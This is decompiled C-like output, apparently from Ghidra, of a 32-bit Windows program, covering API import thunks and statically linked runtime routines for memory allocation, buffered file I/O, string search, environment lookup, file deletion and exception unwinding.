BOOL GetFileVersionInfoA(LPCSTR lptstrFilename,DWORD dwHandle,DWORD dwLen,LPVOID lpData)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00415060. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetFileVersionInfoA(lptstrFilename,dwHandle,dwLen,lpData);
  return BVar1;
}



DWORD GetFileVersionInfoSizeA(LPCSTR lptstrFilename,LPDWORD lpdwHandle)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00415066. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileVersionInfoSizeA(lptstrFilename,lpdwHandle);
  return DVar1;
}



LONG LZCopy(INT hfSource,INT hfDest)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041506c. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = LZCopy(hfSource,hfDest);
  return LVar1;
}



void LZClose(INT hFile)

{
                    // WARNING: Could not recover jumptable at 0x00415072. Too many branches
                    // WARNING: Treating indirect jump as call
  LZClose(hFile);
  return;
}



INT LZOpenFileA(LPSTR lpFileName,LPOFSTRUCT lpReOpenBuf,WORD wStyle)

{
  INT IVar1;
  
                    // WARNING: Could not recover jumptable at 0x00415078. Too many branches
                    // WARNING: Treating indirect jump as call
  IVar1 = LZOpenFileA(lpFileName,lpReOpenBuf,wStyle);
  return IVar1;
}



void Process32Next(void)

{
                    // WARNING: Could not recover jumptable at 0x0041507e. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32Next();
  return;
}



void Process32First(void)

{
                    // WARNING: Could not recover jumptable at 0x00415084. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32First();
  return;
}



void CreateToolhelp32Snapshot(void)

{
                    // WARNING: Could not recover jumptable at 0x0041508a. Too many branches
                    // WARNING: Treating indirect jump as call
  CreateToolhelp32Snapshot();
  return;
}



void __cdecl FUN_00415090(uint *param_1)

{
  FUN_00415228(param_1,1);
  return;
}



void __cdecl FUN_0041509e(LPVOID param_1)

{
  FUN_004150a9(param_1);
  return;
}



void __cdecl FUN_004150a9(LPVOID param_1)

{
  uint *puVar1;
  
  if (param_1 != (LPVOID)0x0) {
    puVar1 = (uint *)FUN_004169a3((int)param_1);
    if (puVar1 != (uint *)0x0) {
      FUN_004169ce(puVar1,(uint)param_1);
      return;
    }
    HeapFree(DAT_0042681c,0,param_1);
  }
  return;
}



undefined4 __cdecl FUN_004150d8(int *param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  uVar2 = 0xffffffff;
  if ((param_1[3] & 0x40U) == 0) {
    if ((param_1[3] & 0x83U) != 0) {
      uVar2 = FUN_004175bd(param_1);
      FUN_00417557(param_1);
      iVar1 = FUN_004174a4(param_1[4]);
      if (iVar1 < 0) {
        uVar2 = 0xffffffff;
      }
      else if ((LPVOID)param_1[7] != (LPVOID)0x0) {
        FUN_004150a9((LPVOID)param_1[7]);
        param_1[7] = 0;
      }
    }
  }
  else {
    uVar2 = 0xffffffff;
  }
  param_1[3] = 0;
  return uVar2;
}



uint __cdecl FUN_0041512e(undefined4 *param_1,uint param_2,uint param_3,byte **param_4)

{
  byte **ppbVar1;
  undefined4 *puVar2;
  int iVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  
  ppbVar1 = param_4;
  puVar6 = (undefined4 *)(param_2 * param_3);
  if (puVar6 == (undefined4 *)0x0) {
    param_3 = 0;
  }
  else {
    puVar5 = param_1;
    param_1 = puVar6;
    if ((*(ushort *)(param_4 + 3) & 0x10c) == 0) {
      param_4 = (byte **)0x1000;
    }
    else {
      param_4 = (byte **)param_4[6];
    }
    do {
      if (((*(ushort *)(ppbVar1 + 3) & 0x10c) == 0) ||
         (puVar2 = (undefined4 *)ppbVar1[1], puVar2 == (undefined4 *)0x0)) {
        if (param_1 < param_4) {
          uVar4 = FUN_0041768f(ppbVar1);
          if (uVar4 == 0xffffffff) goto LAB_0041520a;
          *(char *)puVar5 = (char)uVar4;
          param_4 = (byte **)ppbVar1[6];
          puVar5 = (undefined4 *)((int)puVar5 + 1);
          param_1 = (undefined4 *)((int)param_1 + -1);
        }
        else {
          puVar2 = param_1;
          if (param_4 != (byte **)0x0) {
            puVar2 = (undefined4 *)((int)param_1 - (uint)param_1 % (uint)param_4);
          }
          iVar3 = FUN_00417768((uint)ppbVar1[4],(char *)puVar5,(char *)puVar2);
          if (iVar3 == 0) {
            ppbVar1[3] = (byte *)((uint)ppbVar1[3] | 0x10);
LAB_0041520a:
            return (uint)((int)puVar6 - (int)param_1) / param_2;
          }
          if (iVar3 == -1) {
            ppbVar1[3] = (byte *)((uint)ppbVar1[3] | 0x20);
            goto LAB_0041520a;
          }
          param_1 = (undefined4 *)((int)param_1 - iVar3);
          puVar5 = (undefined4 *)((int)puVar5 + iVar3);
        }
      }
      else {
        puVar7 = param_1;
        if (puVar2 <= param_1) {
          puVar7 = puVar2;
        }
        FUN_00417960(puVar5,(undefined4 *)*ppbVar1,(uint)puVar7);
        param_1 = (undefined4 *)((int)param_1 - (int)puVar7);
        ppbVar1[1] = ppbVar1[1] + -(int)puVar7;
        *ppbVar1 = *ppbVar1 + (int)puVar7;
        puVar5 = (undefined4 *)((int)puVar5 + (int)puVar7);
      }
    } while (param_1 != (undefined4 *)0x0);
  }
  return param_3;
}



void __cdecl FUN_00415216(uint *param_1)

{
  FUN_00415228(param_1,DAT_00425228);
  return;
}



int __cdecl FUN_00415228(uint *param_1,int param_2)

{
  int iVar1;
  
  if (param_1 < (uint *)0xffffffe1) {
    do {
      iVar1 = FUN_00415254(param_1);
      if (iVar1 != 0) {
        return iVar1;
      }
      if (param_2 == 0) {
        return 0;
      }
      iVar1 = FUN_00417c95(param_1);
    } while (iVar1 != 0);
  }
  return 0;
}



void __cdecl FUN_00415254(uint *param_1)

{
  int *piVar1;
  
  if ((param_1 <= DAT_00408708) && (piVar1 = FUN_00416cf9(param_1), piVar1 != (int *)0x0)) {
    return;
  }
  if (param_1 == (uint *)0x0) {
    param_1 = (uint *)0x1;
  }
  HeapAlloc(DAT_0042681c,0,(int)param_1 + 0xfU & 0xfffffff0);
  return;
}



int __cdecl FUN_0041528a(char **param_1)

{
  char *pcVar1;
  char *pcVar2;
  byte bVar3;
  char **ppcVar4;
  DWORD DVar5;
  char *pcVar6;
  char **ppcVar7;
  char *pcVar8;
  int iVar9;
  int local_c;
  DWORD local_8;
  
  ppcVar7 = param_1;
  pcVar6 = param_1[4];
  if ((int)param_1[1] < 0) {
    param_1[1] = (char *)0x0;
  }
  local_8 = FUN_00417e5b((uint)pcVar6,0,1);
  if ((int)local_8 < 0) {
LAB_00415314:
    local_c = -1;
  }
  else {
    pcVar8 = param_1[3];
    if (((uint)pcVar8 & 0x108) == 0) {
      return local_8 - (int)param_1[1];
    }
    pcVar1 = *param_1;
    pcVar2 = param_1[2];
    local_c = (int)pcVar1 - (int)pcVar2;
    if (((uint)pcVar8 & 3) == 0) {
      if (((uint)pcVar8 & 0x80) == 0) {
        DAT_00425194 = 0x16;
        goto LAB_00415314;
      }
    }
    else {
      pcVar8 = pcVar2;
      if ((*(byte *)((&DAT_00426700)[(int)pcVar6 >> 5] + 4 + ((uint)pcVar6 & 0x1f) * 8) & 0x80) != 0
         ) {
        for (; pcVar8 < pcVar1; pcVar8 = pcVar8 + 1) {
          if (*pcVar8 == '\n') {
            local_c = local_c + 1;
          }
        }
      }
    }
    if (local_8 != 0) {
      if ((*(byte *)(param_1 + 3) & 1) != 0) {
        if (param_1[1] == (char *)0x0) {
          local_c = 0;
        }
        else {
          ppcVar4 = (char **)(param_1[1] + ((int)pcVar1 - (int)pcVar2));
          iVar9 = ((uint)pcVar6 & 0x1f) * 8;
          if ((*(byte *)(iVar9 + 4 + (&DAT_00426700)[(int)pcVar6 >> 5]) & 0x80) != 0) {
            DVar5 = FUN_00417e5b((uint)pcVar6,0,2);
            if (DVar5 == local_8) {
              pcVar6 = param_1[2];
              pcVar8 = (char *)((int)ppcVar4 + (int)pcVar6);
              param_1 = ppcVar4;
              for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
                if (*pcVar6 == '\n') {
                  param_1 = (char **)((int)param_1 + 1);
                }
              }
              bVar3 = *(byte *)((int)ppcVar7 + 0xd) & 0x20;
            }
            else {
              FUN_00417e5b((uint)pcVar6,local_8,0);
              ppcVar7 = (char **)0x200;
              if ((((char **)0x200 < ppcVar4) || (((uint)param_1[3] & 8) == 0)) ||
                 (((uint)param_1[3] & 0x400) != 0)) {
                ppcVar7 = (char **)param_1[6];
              }
              bVar3 = *(byte *)(iVar9 + 4 + (&DAT_00426700)[(int)pcVar6 >> 5]) & 4;
              param_1 = ppcVar7;
            }
            ppcVar4 = param_1;
            if (bVar3 != 0) {
              ppcVar4 = (char **)((int)param_1 + 1);
            }
          }
          param_1 = ppcVar4;
          local_8 = local_8 - (int)param_1;
        }
      }
      local_c = local_c + local_8;
    }
  }
  return local_c;
}



int __cdecl FUN_004153e2(char **param_1,int param_2,DWORD param_3)

{
  char *pcVar1;
  int iVar2;
  DWORD DVar3;
  
  if ((((uint)param_1[3] & 0x83) == 0) || (((param_3 != 0 && (param_3 != 1)) && (param_3 != 2)))) {
    DAT_00425194 = 0x16;
    iVar2 = -1;
  }
  else {
    param_1[3] = (char *)((uint)param_1[3] & 0xffffffef);
    if (param_3 == 1) {
      iVar2 = FUN_0041528a(param_1);
      param_2 = param_2 + iVar2;
      param_3 = 0;
    }
    FUN_004175bd((int *)param_1);
    pcVar1 = param_1[3];
    if (((uint)pcVar1 & 0x80) == 0) {
      if (((((uint)pcVar1 & 1) != 0) && (((uint)pcVar1 & 8) != 0)) && (((uint)pcVar1 & 0x400) == 0))
      {
        param_1[6] = (char *)0x200;
      }
    }
    else {
      param_1[3] = (char *)((uint)pcVar1 & 0xfffffffc);
    }
    DVar3 = FUN_00417e5b((uint)param_1[4],param_2,param_3);
    iVar2 = (DVar3 != 0xffffffff) - 1;
  }
  return iVar2;
}



int __cdecl FUN_0041546e(char *param_1,byte *param_2)

{
  int iVar1;
  char *local_24;
  int local_20;
  char *local_1c;
  undefined4 local_18;
  
  local_1c = param_1;
  local_24 = param_1;
  local_18 = 0x42;
  local_20 = 0x7fffffff;
  iVar1 = FUN_0041800a(&local_24,param_2,(undefined4 *)&stack0x0000000c);
  local_20 = local_20 + -1;
  if (local_20 < 0) {
    FUN_00417ef5(0,&local_24);
  }
  else {
    *local_24 = '\0';
  }
  return iVar1;
}



void __cdecl FUN_004154c0(LPCSTR param_1,char *param_2,uint param_3)

{
  undefined4 *puVar1;
  
  puVar1 = FUN_00418984();
  if (puVar1 == (undefined4 *)0x0) {
    return;
  }
  FUN_00418814(param_1,param_2,param_3,puVar1);
  return;
}



void __cdecl FUN_004154e0(LPCSTR param_1,char *param_2)

{
  FUN_004154c0(param_1,param_2,0x40);
  return;
}



void __cdecl FUN_004154f3(uint *param_1,byte *param_2)

{
  void *this;
  uint *local_24;
  char *local_20;
  uint *local_1c;
  undefined4 local_18;
  
  local_18 = 0x49;
  local_1c = param_1;
  local_24 = param_1;
  local_20 = FUN_004194b0(param_1);
  FUN_004189fc(this,(byte **)&local_24,param_2,(undefined4 *)&stack0x0000000c);
  return;
}



uint * __cdecl FUN_00415540(uint *param_1,char param_2)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar1 = (uint)param_1 & 3;
  while (uVar1 != 0) {
    if (*(char *)param_1 == param_2) {
      return param_1;
    }
    if (*(char *)param_1 == '\0') {
      return (uint *)0x0;
    }
    uVar1 = (uint)(uint *)((int)param_1 + 1) & 3;
    param_1 = (uint *)((int)param_1 + 1);
  }
  while( true ) {
    while( true ) {
      uVar1 = *param_1;
      uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2,param_2),CONCAT11(param_2,param_2));
      uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;
      puVar5 = param_1 + 1;
      if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;
      param_1 = puVar5;
      if ((uVar3 & 0x81010100) != 0) {
        if ((uVar3 & 0x1010100) != 0) {
          return (uint *)0x0;
        }
        if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {
          return (uint *)0x0;
        }
      }
    }
    uVar1 = *param_1;
    if ((char)uVar1 == param_2) {
      return param_1;
    }
    if ((char)uVar1 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 8);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 1);
    }
    if (cVar2 == '\0') break;
    cVar2 = (char)(uVar1 >> 0x10);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 2);
    }
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 0x18);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 3);
    }
    param_1 = puVar5;
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
  }
  return (uint *)0x0;
}



uint * __cdecl FUN_004155fc(int param_1,int param_2)

{
  int iVar1;
  uint *puVar2;
  uint *puVar3;
  uint *puVar4;
  
  puVar2 = (uint *)(param_1 * param_2);
  puVar3 = puVar2;
  if (puVar2 < (uint *)0xffffffe1) {
    if (puVar2 == (uint *)0x0) {
      puVar3 = (uint *)0x1;
    }
    puVar3 = (uint *)((int)puVar3 + 0xfU & 0xfffffff0);
  }
  do {
    puVar4 = (uint *)0x0;
    if (puVar3 < (uint *)0xffffffe1) {
      if ((puVar2 < DAT_00408708 || (int)puVar2 - (int)DAT_00408708 == 0) &&
         (puVar4 = (uint *)FUN_00416cf9(puVar2), puVar4 != (uint *)0x0)) {
        FUN_00419530(puVar4,0,(uint)puVar2);
        return puVar4;
      }
      puVar4 = (uint *)HeapAlloc(DAT_0042681c,8,(SIZE_T)puVar3);
      if (puVar4 != (uint *)0x0) {
        return puVar4;
      }
    }
    if (DAT_00425228 == 0) {
      return puVar4;
    }
    iVar1 = FUN_00417c95(puVar3);
  } while (iVar1 != 0);
  return (uint *)0x0;
}



void FUN_00415679(undefined *UNRECOVERED_JUMPTABLE)

{
  undefined4 *unaff_FS_OFFSET;
  
  *unaff_FS_OFFSET = *(undefined4 *)*unaff_FS_OFFSET;
                    // WARNING: Could not recover jumptable at 0x004156a4. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_004156ad(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x004156b2. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_004156b4(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x004156b9. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_004156bb(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  undefined4 *puVar1;
  undefined4 *unaff_FS_OFFSET;
  
  puVar1 = (undefined4 *)*unaff_FS_OFFSET;
  RtlUnwind(param_1,(PVOID)0x4156e3,param_2,(PVOID)0x0);
  param_2->ExceptionFlags = param_2->ExceptionFlags & 0xfffffffd;
  *puVar1 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = puVar1;
  return;
}



undefined4 __thiscall
FUN_0041570a(void *this,PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3,
            undefined4 param_4)

{
  int *in_EAX;
  undefined4 uVar1;
  
  uVar1 = FUN_00419588(this,param_1,param_2,param_3,param_4,in_EAX,0,(PVOID)0x0,'\0');
  return uVar1;
}



undefined4 __cdecl
FUN_00415740(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4,int param_5)

{
  undefined4 uVar1;
  int **unaff_FS_OFFSET;
  int *local_18;
  code *local_14;
  undefined4 local_10;
  undefined4 local_c;
  int local_8;
  
  local_10 = param_2;
  local_14 = FUN_00415794;
  local_8 = param_4 + 1;
  local_c = param_1;
  local_18 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int *)&local_18;
  uVar1 = FUN_00419d90(param_3,param_1,param_5);
  *unaff_FS_OFFSET = local_18;
  return uVar1;
}



void __thiscall FUN_00415794(void *this,PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3)

{
  FUN_00419588(this,param_1,*(PVOID *)((int)param_2 + 0xc),param_3,0,*(int **)((int)param_2 + 8),
               *(int *)((int)param_2 + 0x10),param_2,'\0');
  return;
}



undefined4 __cdecl
FUN_004157b9(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7)

{
  int *unaff_FS_OFFSET;
  undefined4 *local_34;
  undefined4 local_30;
  undefined4 *local_2c;
  code *local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffbc;
  local_28 = FUN_0041586d;
  local_24 = param_5;
  local_20 = param_2;
  local_1c = param_6;
  local_18 = param_7;
  local_8 = 0;
  local_14 = 0x41583f;
  local_2c = (undefined4 *)*unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int)&local_2c;
  local_34 = param_1;
  local_30 = param_3;
  (*DAT_00425238)(*param_1,&local_34);
  if (local_8 == 0) {
    *unaff_FS_OFFSET = (int)local_2c;
  }
  else {
    *local_2c = *(undefined4 *)*unaff_FS_OFFSET;
    *unaff_FS_OFFSET = (int)local_2c;
  }
  return 0;
}



undefined4 __thiscall
FUN_0041586d(void *this,PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3)

{
  undefined4 uVar1;
  
  if ((param_1->ExceptionFlags & 0x66) != 0) {
    *(undefined4 *)((int)param_2 + 0x24) = 1;
    return 1;
  }
  FUN_00419588(this,param_1,*(PVOID *)((int)param_2 + 0xc),param_3,0,*(int **)((int)param_2 + 8),
               *(int *)((int)param_2 + 0x10),*(PVOID *)((int)param_2 + 0x14),'\x01');
  if (*(int *)((int)param_2 + 0x24) == 0) {
    FUN_004156bb(param_2,param_1);
  }
                    // WARNING: Could not recover jumptable at 0x004158d7. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = (**(code **)((int)param_2 + 0x18))();
  return uVar1;
}



int __thiscall
FUN_004158e2(void *this,uint param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  uint local_8;
  
  uVar2 = param_1;
  local_8 = *(uint *)(param_1 + 0xc);
  iVar1 = *(int *)(param_1 + 0x10);
  uVar3 = local_8;
  param_1 = local_8;
  if (-1 < param_2) {
    do {
      if (uVar3 == 0xffffffff) {
        FUN_00419e32((int)this);
      }
      uVar3 = uVar3 - 1;
      if (((*(int *)(iVar1 + 4 + uVar3 * 0x14) < param_3) &&
          (param_3 <= *(int *)(iVar1 + uVar3 * 0x14 + 8))) || (uVar3 == 0xffffffff)) {
        param_2 = param_2 + -1;
        local_8 = param_1;
        param_1 = uVar3;
      }
      this = (void *)param_3;
    } while (-1 < param_2);
  }
  uVar3 = uVar3 + 1;
  *param_4 = uVar3;
  *param_5 = local_8;
  if ((*(uint *)(uVar2 + 0xc) < local_8) || (local_8 < uVar3)) {
    FUN_00419e32((int)param_5);
  }
  return iVar1 + uVar3 * 0x14;
}



void __cdecl FUN_00415960(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x415978,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



void __cdecl FUN_004159a2(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined4 local_14;
  int iStack_10;
  
  iStack_10 = param_1;
  puStack_18 = &LAB_00415980;
  uStack_1c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_1c;
  while( true ) {
    iVar1 = *(int *)(param_1 + 8);
    iVar2 = *(int *)(param_1 + 0xc);
    if ((iVar2 == -1) || (iVar2 == param_2)) break;
    local_14 = *(undefined4 *)(iVar1 + iVar2 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_14;
    if (*(int *)(iVar1 + 4 + iVar2 * 0xc) == 0) {
      FUN_00415a36();
      (**(code **)(iVar1 + 8 + iVar2 * 0xc))();
    }
  }
  *unaff_FS_OFFSET = uStack_1c;
  return;
}



undefined4 FUN_00415a0a(void)

{
  int iVar1;
  undefined4 uVar2;
  int *unaff_FS_OFFSET;
  
  uVar2 = 0;
  iVar1 = *unaff_FS_OFFSET;
  if ((*(undefined **)(iVar1 + 4) == &LAB_00415980) &&
     (*(int *)(iVar1 + 8) == *(int *)(*(int *)(iVar1 + 0xc) + 0xc))) {
    uVar2 = 1;
  }
  return uVar2;
}



void __fastcall FUN_00415a2d(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_004086e8 = param_1;
  DAT_004086e4 = in_EAX;
  DAT_004086ec = unaff_EBP;
  return;
}



void FUN_00415a36(void)

{
  undefined4 in_EAX;
  int unaff_EBP;
  
  DAT_004086e8 = *(undefined4 *)(unaff_EBP + 8);
  DAT_004086e4 = in_EAX;
  DAT_004086ec = unaff_EBP;
  return;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_00415a50(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



uint * __cdecl FUN_00415a80(uint *param_1,char *param_2)

{
  char *pcVar1;
  char *pcVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  char cVar6;
  uint uVar7;
  uint uVar8;
  char *pcVar9;
  uint *puVar10;
  
  cVar3 = *param_2;
  if (cVar3 == '\0') {
    return param_1;
  }
  if (param_2[1] == '\0') {
    uVar4 = (uint)param_1 & 3;
    while (uVar4 != 0) {
      if (*(char *)param_1 == cVar3) {
        return param_1;
      }
      if (*(char *)param_1 == '\0') {
        return (uint *)0x0;
      }
      uVar4 = (uint)(uint *)((int)param_1 + 1) & 3;
      param_1 = (uint *)((int)param_1 + 1);
    }
    while( true ) {
      while( true ) {
        uVar4 = *param_1;
        uVar8 = uVar4 ^ CONCAT22(CONCAT11(cVar3,cVar3),CONCAT11(cVar3,cVar3));
        uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;
        puVar10 = param_1 + 1;
        if (((uVar8 ^ 0xffffffff ^ uVar8 + 0x7efefeff) & 0x81010100) != 0) break;
        param_1 = puVar10;
        if ((uVar7 & 0x81010100) != 0) {
          if ((uVar7 & 0x1010100) != 0) {
            return (uint *)0x0;
          }
          if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {
            return (uint *)0x0;
          }
        }
      }
      uVar4 = *param_1;
      if ((char)uVar4 == cVar3) {
        return param_1;
      }
      if ((char)uVar4 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 8);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 1);
      }
      if (cVar6 == '\0') break;
      cVar6 = (char)(uVar4 >> 0x10);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 2);
      }
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 0x18);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 3);
      }
      param_1 = puVar10;
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
    }
    return (uint *)0x0;
  }
  do {
    cVar6 = *(char *)param_1;
    do {
      while (puVar10 = param_1, param_1 = (uint *)((int)puVar10 + 1), cVar6 != cVar3) {
        if (cVar6 == '\0') {
          return (uint *)0x0;
        }
        cVar6 = *(char *)param_1;
      }
      cVar6 = *(char *)param_1;
      pcVar9 = param_2;
      puVar5 = puVar10;
    } while (cVar6 != param_2[1]);
    do {
      if (pcVar9[2] == '\0') {
        return puVar10;
      }
      if (*(char *)(uint *)((int)puVar5 + 2) != pcVar9[2]) break;
      pcVar1 = pcVar9 + 3;
      if (*pcVar1 == '\0') {
        return puVar10;
      }
      pcVar2 = (char *)((int)puVar5 + 3);
      pcVar9 = pcVar9 + 2;
      puVar5 = (uint *)((int)puVar5 + 2);
    } while (*pcVar1 == *pcVar2);
  } while( true );
}



uint __cdecl FUN_00415b00(undefined4 *param_1,uint param_2,uint param_3,char **param_4)

{
  char **ppcVar1;
  int iVar2;
  char **ppcVar3;
  uint uVar4;
  char **ppcVar5;
  char **ppcVar6;
  char **ppcVar7;
  
  ppcVar1 = param_4;
  ppcVar6 = (char **)(param_2 * param_3);
  if (ppcVar6 == (char **)0x0) {
    param_3 = 0;
  }
  else {
    ppcVar5 = ppcVar6;
    if ((*(ushort *)(param_4 + 3) & 0x10c) == 0) {
      param_4 = (char **)0x1000;
    }
    else {
      param_4 = (char **)param_4[6];
    }
    do {
      if ((((uint)ppcVar1[3] & 0x108) == 0) ||
         (ppcVar7 = (char **)ppcVar1[1], ppcVar7 == (char **)0x0)) {
        if (param_4 <= ppcVar5) {
          if ((((uint)ppcVar1[3] & 0x108) != 0) &&
             (iVar2 = FUN_004175bd((int *)ppcVar1), iVar2 != 0)) {
LAB_00415c01:
            return (uint)((int)ppcVar6 - (int)ppcVar5) / param_2;
          }
          ppcVar7 = ppcVar5;
          if (param_4 != (char **)0x0) {
            ppcVar7 = (char **)((int)ppcVar5 - (uint)ppcVar5 % (uint)param_4);
          }
          ppcVar3 = (char **)FUN_00419e88((DWORD)ppcVar1[4],(char *)param_1,(uint)ppcVar7);
          if ((ppcVar3 == (char **)0xffffffff) ||
             (ppcVar5 = (char **)((int)ppcVar5 - (int)ppcVar3), ppcVar3 < ppcVar7)) {
            ppcVar1[3] = (char *)((uint)ppcVar1[3] | 0x20);
            goto LAB_00415c01;
          }
          goto LAB_00415bb8;
        }
        uVar4 = FUN_00417ef5((int)*(char *)param_1,ppcVar1);
        if (uVar4 == 0xffffffff) goto LAB_00415c01;
        param_1 = (undefined4 *)((int)param_1 + 1);
        param_4 = (char **)ppcVar1[6];
        ppcVar5 = (char **)((int)ppcVar5 - 1);
        if ((int)param_4 < 1) {
          param_4 = (char **)0x1;
        }
      }
      else {
        ppcVar3 = ppcVar5;
        if (ppcVar7 <= ppcVar5) {
          ppcVar3 = ppcVar7;
        }
        FUN_00417960((undefined4 *)*ppcVar1,param_1,(uint)ppcVar3);
        ppcVar1[1] = ppcVar1[1] + -(int)ppcVar3;
        *ppcVar1 = *ppcVar1 + (int)ppcVar3;
        ppcVar5 = (char **)((int)ppcVar5 - (int)ppcVar3);
LAB_00415bb8:
        param_1 = (undefined4 *)((int)param_1 + (int)ppcVar3);
      }
    } while (ppcVar5 != (char **)0x0);
  }
  return param_3;
}



char * __cdecl FUN_00415c0a(uint *param_1)

{
  int iVar1;
  char *pcVar2;
  char *pcVar3;
  uint **ppuVar4;
  
  if (((DAT_00426824 != 0) &&
      ((DAT_004251bc != (uint **)0x0 ||
       (((DAT_004251c4 != 0 && (iVar1 = FUN_0041a074(), iVar1 == 0)) &&
        (DAT_004251bc != (uint **)0x0)))))) && (ppuVar4 = DAT_004251bc, param_1 != (uint *)0x0)) {
    pcVar2 = FUN_004194b0(param_1);
    for (; *ppuVar4 != (uint *)0x0; ppuVar4 = ppuVar4 + 1) {
      pcVar3 = FUN_004194b0(*ppuVar4);
      if (((pcVar2 < pcVar3) && (*(char *)((int)*ppuVar4 + (int)pcVar2) == '=')) &&
         (iVar1 = FUN_0041a035((byte *)*ppuVar4,(byte *)param_1,(int)pcVar2), iVar1 == 0)) {
        return pcVar2 + (int)*ppuVar4 + 1;
      }
    }
  }
  return (char *)0x0;
}



undefined4 __cdecl FUN_00415c87(LPCSTR param_1)

{
  BOOL BVar1;
  uint uVar2;
  
  BVar1 = DeleteFileA(param_1);
  if (BVar1 == 0) {
    uVar2 = GetLastError();
  }
  else {
    uVar2 = 0;
  }
  if (uVar2 != 0) {
    FUN_0041a0e2(uVar2);
    return 0xffffffff;
  }
  return 0;
}



void __cdecl FUN_00415cb1(LPCSTR param_1)

{
  FUN_00415c87(param_1);
  return;
}



undefined4 __cdecl FUN_00415cbc(LPCSTR param_1)

{
  undefined uVar1;
  BOOL BVar2;
  DWORD DVar3;
  uint uVar4;
  byte local_10c;
  byte local_10b;
  
  BVar2 = SetCurrentDirectoryA(param_1);
  if (BVar2 != 0) {
    DVar3 = GetCurrentDirectoryA(0x105,(LPSTR)&local_10c);
    if (DVar3 != 0) {
      if (((local_10c != 0x5c) && (local_10c != 0x2f)) || (local_10c != local_10b)) {
        param_1 = (LPCSTR)CONCAT31(param_1._1_3_,0x3d);
        uVar4 = FUN_0041a149((uint)local_10c);
        uVar1 = SUB41(param_1,0);
        param_1 = (LPCSTR)(uint)CONCAT12(0x3a,CONCAT11((char)uVar4,uVar1));
        BVar2 = SetEnvironmentVariableA((LPCSTR)&param_1,(LPCSTR)&local_10c);
        if (BVar2 == 0) goto LAB_00415d30;
      }
      return 0;
    }
  }
LAB_00415d30:
  DVar3 = GetLastError();
  FUN_0041a0e2(DVar3);
  return 0xffffffff;
}



